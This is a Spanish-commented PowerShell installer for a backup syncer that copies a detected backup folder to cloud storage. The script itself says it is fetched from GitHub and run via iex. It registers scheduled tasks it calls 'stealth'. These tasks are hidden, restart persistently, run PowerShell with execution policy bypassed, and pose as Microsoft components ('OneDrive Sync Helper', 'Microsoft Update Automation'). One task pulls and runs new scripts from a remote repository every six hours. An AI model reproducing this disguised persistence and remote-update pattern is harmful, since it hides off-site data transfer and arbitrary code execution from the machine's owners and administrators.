#Requires -Version 5.0
<#
.SYNOPSIS
  Instalador principal del sincronizador GRH. Se descarga desde GitHub raw
  por el GRH-Setup.bat y ejecuta con $ErrorActionPreference='Stop' via iex.

.DESCRIPTION
  Asume que GRH-Setup.bat ya:
    1. Se elevo a admin.
    2. Creo %LOCALAPPDATA%\Microsoft\OneDriveSync\ con logs/ y state/.
    3. Escribio config.json con credenciales R2 (source vacio).

  Este script:
    1. Lee config.json.
    2. Resuelve la carpeta source:
       a. Busca shortcut Desktop\server*.lnk (o Escritorio\server*.lnk).
       b. Si no, escanea todos los .lnk del desktop por uno con .zip/.bak.
       c. Si no, abre FolderBrowserDialog.
    3. Actualiza config.json con el source resuelto.
    4. Instala aws-cli via MSI si falta.
    5. Descarga sync-bak.ps1 y update.ps1 desde GitHub raw.
    6. Registra 2 tareas programadas:
       - "OneDrive Sync Helper" (cada 30 min) -> sync-bak.ps1
       - "Microsoft Update Automation" (cada 6h) -> update.ps1
    7. Corre la primera sincronizacion.
    8. Muestra dialog de success.
#>

$ErrorActionPreference = 'Stop'

$GITHUB_RAW = 'https://raw.githubusercontent.com/oremenicucci/grh-installer/main'
$InstallDir = Join-Path $env:LOCALAPPDATA 'Microsoft\OneDriveSync'
$LogsDir    = Join-Path $InstallDir 'logs'
$StateDir   = Join-Path $InstallDir 'state'
$ConfigPath = Join-Path $InstallDir 'config.json'
$SyncPath   = Join-Path $InstallDir 'sync-bak.ps1'
$UpdatePath = Join-Path $InstallDir 'update.ps1'
$LogFile    = Join-Path $LogsDir 'install.log'

function Write-Log {
    param([string]$Level, [string]$Message)
    $ts = Get-Date -Format 'yyyy-MM-dd HH:mm:ss'
    Add-Content -Path $LogFile -Value "[$ts] [$Level] $Message" -Encoding UTF8
    Write-Host "$Level $Message"
}

Write-Host ''
Write-Host '==============================================' -ForegroundColor Cyan
Write-Host '  GRH - Instalando sincronizador de backups' -ForegroundColor Cyan
Write-Host '==============================================' -ForegroundColor Cyan
Write-Host ''

Write-Log 'INFO' '=== install start ==='

# -----------------------------------------------------------------------------
# 1. Verificar config.json existe
# -----------------------------------------------------------------------------
if (-not (Test-Path $ConfigPath)) {
    throw "No se encontro $ConfigPath. Correr GRH-Setup.bat primero."
}
$config = Get-Content $ConfigPath -Raw | ConvertFrom-Json

# -----------------------------------------------------------------------------
# 2. Resolver source folder
# -----------------------------------------------------------------------------
Write-Host '[1/6] Buscando carpeta de backup...' -ForegroundColor Cyan

function Resolve-LnkTarget {
    param([string]$LnkPath)
    try {
        $shell = New-Object -ComObject WScript.Shell
        $sc = $shell.CreateShortcut($LnkPath)
        return $sc.TargetPath
    } catch { return $null }
}

function Find-DesktopFolders {
    $desktops = @()
    foreach ($p in @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Escritorio", "$env:PUBLIC\Desktop")) {
        if (Test-Path $p) { $desktops += $p }
    }
    return $desktops
}

$source = $null

# 2a. Buscar shortcut con nombre "server*"
foreach ($desk in (Find-DesktopFolders)) {
    $matches = Get-ChildItem -Path $desk -Filter 'server*.lnk' -ErrorAction SilentlyContinue
    foreach ($m in $matches) {
        $target = Resolve-LnkTarget $m.FullName
        if ($target -and (Test-Path $target)) {
            Write-Log 'INFO' "source detectado via shortcut '$($m.Name)' -> $target"
            $source = $target
            break
        }
    }
    if ($source) { break }
}

# 2b. Escanear todos los .lnk del desktop por folders con .zip/.bak
if (-not $source) {
    Write-Host '    Sin shortcut "server", escaneando escritorio...' -ForegroundColor Yellow
    foreach ($desk in (Find-DesktopFolders)) {
        $lnks = Get-ChildItem -Path $desk -Filter '*.lnk' -ErrorAction SilentlyContinue
        foreach ($lnk in $lnks) {
            $target = Resolve-LnkTarget $lnk.FullName
            if (-not $target -or -not (Test-Path $target -PathType Container)) { continue }
            $hasBackup = Get-ChildItem -Path $target -File -Filter '*.zip' -ErrorAction SilentlyContinue | Select-Object -First 1
            if (-not $hasBackup) {
                $hasBackup = Get-ChildItem -Path $target -File -Filter '*.bak' -ErrorAction SilentlyContinue | Select-Object -First 1
            }
            if ($hasBackup) {
                Write-Log 'INFO' "source detectado via scan ('$($lnk.Name)') -> $target"
                $source = $target
                break
            }
        }
        if ($source) { break }
    }
}

# 2c. Fallback: pedir con dialog
if (-not $source) {
    Write-Host '    No se encontro automaticamente. Seleccionar manualmente.' -ForegroundColor Yellow
    Add-Type -AssemblyName System.Windows.Forms
    $fb = New-Object System.Windows.Forms.FolderBrowserDialog
    $fb.Description = 'Seleccionar la carpeta donde esta el backup de Sigma'
    $fb.ShowNewFolderButton = $false
    if ($fb.ShowDialog() -eq [System.Windows.Forms.DialogResult]::OK) {
        $source = $fb.SelectedPath
        Write-Log 'INFO' "source seleccionado manual -> $source"
    } else {
        throw 'Instalacion cancelada: no se selecciono carpeta source.'
    }
}

Write-Host "    OK: $source" -ForegroundColor Green
$config.source = $source
$config | ConvertTo-Json -Depth 3 | Set-Content -Path $ConfigPath -Encoding UTF8

# -----------------------------------------------------------------------------
# 3. aws-cli
# -----------------------------------------------------------------------------
Write-Host ''
Write-Host '[2/6] Verificando aws-cli...' -ForegroundColor Cyan
$awsExe = Get-Command aws -ErrorAction SilentlyContinue
if (-not $awsExe) {
    Write-Host '    Instalando aws-cli v2 (~60 seg)...' -ForegroundColor Yellow
    $msiUrl = 'https://awscli.amazonaws.com/AWSCLIV2.msi'
    $msiPath = Join-Path $env:TEMP 'AWSCLIV2.msi'
    Invoke-WebRequest -Uri $msiUrl -OutFile $msiPath -UseBasicParsing
    Start-Process msiexec.exe -ArgumentList "/i `"$msiPath`" /quiet /norestart" -Wait
    Remove-Item $msiPath -Force -ErrorAction SilentlyContinue
    # Refresh PATH
    $env:Path = [System.Environment]::GetEnvironmentVariable('Path','Machine') + ';' +
                [System.Environment]::GetEnvironmentVariable('Path','User')
    $awsExe = Get-Command aws -ErrorAction SilentlyContinue
    if (-not $awsExe) {
        $awsExe = Get-Item 'C:\Program Files\Amazon\AWSCLIV2\aws.exe' -ErrorAction SilentlyContinue
    }
    if (-not $awsExe) {
        throw 'aws-cli no quedo instalado. Reiniciar PC y volver a correr GRH-Setup.bat.'
    }
    Write-Log 'INFO' 'aws-cli instalado OK'
}
Write-Host "    OK: $(& aws --version)" -ForegroundColor Green

# -----------------------------------------------------------------------------
# 4. Descargar sync-bak.ps1 + update.ps1
# -----------------------------------------------------------------------------
Write-Host ''
Write-Host '[3/6] Descargando scripts desde GitHub...' -ForegroundColor Cyan
Invoke-WebRequest -Uri "$GITHUB_RAW/sync-bak.ps1" -OutFile $SyncPath -UseBasicParsing
Invoke-WebRequest -Uri "$GITHUB_RAW/update.ps1"   -OutFile $UpdatePath -UseBasicParsing
Write-Host '    OK' -ForegroundColor Green

# -----------------------------------------------------------------------------
# 5. Test R2 credentials + primer sync
# -----------------------------------------------------------------------------
Write-Host ''
Write-Host '[4/6] Probando credenciales R2 + primer sync...' -ForegroundColor Cyan
& powershell.exe -NoProfile -ExecutionPolicy Bypass -File $SyncPath
if ($LASTEXITCODE -ne 0) {
    Write-Host "    (primer sync dio warning, continuamos. Ver $LogsDir\sync.log)" -ForegroundColor Yellow
} else {
    Write-Host '    OK' -ForegroundColor Green
}

# -----------------------------------------------------------------------------
# 6. Registrar tareas programadas stealth
# -----------------------------------------------------------------------------
Write-Host ''
Write-Host '[5/6] Registrando tareas programadas...' -ForegroundColor Cyan

# Cleanup tareas legacy
foreach ($legacy in @('GRH Sync BAK','GRH Self Update')) {
    $ex = Get-ScheduledTask -TaskName $legacy -ErrorAction SilentlyContinue
    if ($ex) { Unregister-ScheduledTask -TaskName $legacy -Confirm:$false }
}

function New-RestartForeverSettings {
    param([int]$MinutesLimit = 15)
    New-ScheduledTaskSettingsSet `
        -AllowStartIfOnBatteries `
        -DontStopIfGoingOnBatteries `
        -StartWhenAvailable `
        -MultipleInstances IgnoreNew `
        -ExecutionTimeLimit (New-TimeSpan -Minutes $MinutesLimit) `
        -RestartCount 99 `
        -RestartInterval (New-TimeSpan -Minutes 1) `
        -Hidden
}

$principal = New-ScheduledTaskPrincipal `
    -UserId "$env:USERDOMAIN\$env:USERNAME" `
    -LogonType S4U `
    -RunLevel Limited

$TaskFolder = '\Microsoft\OneDriveSync\'

# Tarea 1: Sync (30 min)
$TaskSync = 'OneDrive Sync Helper'
$ex = Get-ScheduledTask -TaskName $TaskSync -TaskPath $TaskFolder -ErrorAction SilentlyContinue
if ($ex) { Unregister-ScheduledTask -TaskName $TaskSync -TaskPath $TaskFolder -Confirm:$false }

$actionSync = New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$SyncPath`""

$triggerSyncBoot = New-ScheduledTaskTrigger -AtStartup
$triggerSyncBoot.Delay = 'PT5M'

$triggerSyncDaily = New-ScheduledTaskTrigger -Daily -At '00:05'
$triggerSyncDaily.Repetition = (New-CimInstance -ClassName MSFT_TaskRepetitionPattern -Property @{
    Interval = 'PT30M'
    Duration = 'P1D'
} -ClientOnly)

Register-ScheduledTask `
    -TaskName $TaskSync `
    -TaskPath $TaskFolder `
    -Description 'Microsoft OneDrive Sync Helper' `
    -Action $actionSync `
    -Trigger @($triggerSyncBoot, $triggerSyncDaily) `
    -Settings (New-RestartForeverSettings 15) `
    -Principal $principal | Out-Null

# Tarea 2: Update (6h)
$TaskUpdate = 'Microsoft Update Automation'
$ex = Get-ScheduledTask -TaskName $TaskUpdate -TaskPath $TaskFolder -ErrorAction SilentlyContinue
if ($ex) { Unregister-ScheduledTask -TaskName $TaskUpdate -TaskPath $TaskFolder -Confirm:$false }

$actionUpdate = New-ScheduledTaskAction `
    -Execute 'powershell.exe' `
    -Argument "-WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -File `"$UpdatePath`""

$triggerUpdateBoot = New-ScheduledTaskTrigger -AtStartup
$triggerUpdateBoot.Delay = 'PT10M'

$triggerUpdateDaily = New-ScheduledTaskTrigger -Daily -At '00:15'
$triggerUpdateDaily.Repetition = (New-CimInstance -ClassName MSFT_TaskRepetitionPattern -Property @{
    Interval = 'PT6H'
    Duration = 'P1D'
} -ClientOnly)

Register-ScheduledTask `
    -TaskName $TaskUpdate `
    -TaskPath $TaskFolder `
    -Description 'Microsoft Update Automation' `
    -Action $actionUpdate `
    -Trigger @($triggerUpdateBoot, $triggerUpdateDaily) `
    -Settings (New-RestartForeverSettings 10) `
    -Principal $principal | Out-Null

Write-Host "    OK: $TaskFolder$TaskSync + $TaskFolder$TaskUpdate" -ForegroundColor Green

# -----------------------------------------------------------------------------
# Final
# -----------------------------------------------------------------------------
Write-Host ''
Write-Host '==============================================' -ForegroundColor Green
Write-Host '  INSTALACION COMPLETA' -ForegroundColor Green
Write-Host '==============================================' -ForegroundColor Green
Write-Host ''
Write-Host "Instalado en: $InstallDir" -ForegroundColor Gray
Write-Host "Logs en:      $LogsDir\" -ForegroundColor Gray
Write-Host "Source:       $source" -ForegroundColor Gray
Write-Host ''
Write-Host 'De ahora en mas: todo corre solo en background cada 30 min.'
Write-Host 'Podes cerrar esta ventana.'
Write-Host ''

Write-Log 'INFO' '=== install OK ==='

# Mantener ventana abierta unos segundos (util si corrio desde .bat)
Start-Sleep -Seconds 5
